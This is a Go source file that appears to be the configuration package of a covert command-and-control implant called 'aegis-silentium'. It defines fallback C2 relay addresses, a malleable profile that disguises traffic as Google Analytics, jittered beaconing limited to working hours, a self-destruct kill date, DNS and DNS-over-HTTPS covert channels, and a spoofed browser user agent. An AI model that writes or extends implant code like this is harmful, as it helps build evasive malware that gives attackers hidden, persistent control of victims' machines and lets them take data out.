// Package config holds all compile-time and runtime configuration for the implant.
// Sensitive values (C2 addresses, keys) are baked in at build time via ldflags:
//
//	go build -ldflags "-X aegis-silentium/implant/config.C2Address=https://relay.example.com \
//	                   -X aegis-silentium/implant/config.C2Pubkey=<hex> \
//	                   -X aegis-silentium/implant/config.ProfileName=google-analytics"
package config

import (
	"encoding/hex"
	"os"
	"strconv"
	"time"
)

// ── Build-time injectable variables (via ldflags) ─────────────────────────────
var (
	C2Address   = "https://127.0.0.1:8443"    // Primary C2 relay address
	C2Address2  = ""                           // Fallback C2 relay address
	C2Address3  = ""                           // Second fallback
	C2Pubkey    = ""                           // Relay ECDSA P-256 public key (hex)
	ProfileName = "default"                    // Malleable C2 profile name
	KillDate    = ""                           // YYYY-MM-DD; implant self-destructs after this
	WorkingHours = ""                          // "09:00-17:00" restrict beaconing to working hours
	JitterPct   = "20"                         // Beacon jitter percentage (0-100)
	SleepSec    = "60"                         // Base beacon sleep in seconds
	UserAgent   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	ProxyURL    = ""                           // HTTP proxy (optional)
	DNSServer   = "8.8.8.8:53"               // DNS resolver for DNS/DoH channels
	DoHURL      = "https://cloudflare-dns.com/dns-query" // DoH resolver
	C2Domain    = ""                           // Domain for DNS C2 channel
	AuthToken   = ""                           // Pre-shared auth token (hex-encoded)
)

// Config is the runtime configuration object used by all implant modules.
type Config struct {
	// Identity
	HostID string
	OS     string
	Arch   string

	// C2 connectivity
	C2Addresses []string
	RelayPubkey []byte
	Profile     string
	AuthToken   []byte

	// Timing
	SleepInterval time.Duration
	JitterPct     int
	KillDate      time.Time
	WorkingHours  [2]int // [startHour, endHour] in 24h; 0,0 = unrestricted

	// Transport options
	UserAgent string
	ProxyURL  string
	DNSServer string
	DoHURL    string
	C2Domain  string
}

// Load builds a Config from the baked-in ldflags values.
func Load() *Config {
	cfg := &Config{
		Profile:   ProfileName,
		UserAgent: UserAgent,
		ProxyURL:  ProxyURL,
		DNSServer: DNSServer,
		DoHURL:    DoHURL,
		C2Domain:  C2Domain,
	}

	// C2 address list
	cfg.C2Addresses = []string{C2Address}
	if C2Address2 != "" {
		cfg.C2Addresses = append(cfg.C2Addresses, C2Address2)
	}
	if C2Address3 != "" {
		cfg.C2Addresses = append(cfg.C2Addresses, C2Address3)
	}

	// Relay public key
	if C2Pubkey != "" {
		if b, err := hex.DecodeString(C2Pubkey); err == nil {
			cfg.RelayPubkey = b
		}
	}

	// Auth token
	if AuthToken != "" {
		if b, err := hex.DecodeString(AuthToken); err == nil {
			cfg.AuthToken = b
		}
	}

	// Sleep interval
	secs, _ := strconv.Atoi(SleepSec)
	if secs < 5 {
		secs = 60
	}
	cfg.SleepInterval = time.Duration(secs) * time.Second

	// Jitter
	j, _ := strconv.Atoi(JitterPct)
	if j < 0 || j > 100 {
		j = 20
	}
	cfg.JitterPct = j

	// Kill date
	if KillDate != "" {
		if t, err := time.Parse("2006-01-02", KillDate); err == nil {
			cfg.KillDate = t
		}
	}

	// Working hours  "09:00-17:00" → [9, 17]
	if WorkingHours != "" && len(WorkingHours) >= 11 {
		sh, _ := strconv.Atoi(WorkingHours[0:2])
		eh, _ := strconv.Atoi(WorkingHours[6:8])
		cfg.WorkingHours = [2]int{sh, eh}
	}

	// Environment variable overrides (for debugging / re-config without rebuild)
	if v := os.Getenv("AEGIS_C2"); v != "" {
		cfg.C2Addresses = []string{v}
	}

	return cfg
}
